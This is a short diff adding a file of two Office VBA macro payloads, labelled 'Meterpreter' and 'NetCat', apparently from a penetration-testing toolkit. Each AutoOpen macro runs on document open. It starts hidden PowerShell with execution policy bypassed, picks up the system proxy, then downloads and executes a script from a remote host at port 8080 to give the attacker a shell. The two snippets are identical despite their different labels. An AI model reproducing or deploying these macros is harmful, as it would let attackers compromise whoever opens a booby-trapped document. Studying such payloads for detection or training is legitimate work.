@@ -1,0 +1,13 @@
+
+
+# Meterpreter
+Sub AutoOpen()
+    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""$enable = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable; $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer; $wc = new-object system.net.WebClient; $url = 'http://172.30.207.111:8080/shell'; if( $enable -eq 1 ) { $proxy = new-object System.Net.WebProxy; $proxy.Address = $webproxy; $wc.proxy = $proxy; }; $webpage = $wc.downloadstring($url) | iex; Read-Host '...';""", 1)
+End Sub
+
+# NetCat
+Sub AutoOpen()
+    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""$enable = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable; $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer; $wc = new-object system.net.WebClient; $url = 'http://172.30.207.111:8080/shell'; if( $enable -eq 1 ) { $proxy = new-object System.Net.WebProxy; $proxy.Address = $webproxy; $wc.proxy = $proxy; }; $webpage = $wc.downloadstring($url) | iex; Read-Host '...';""", 1)
+End Sub
+
+
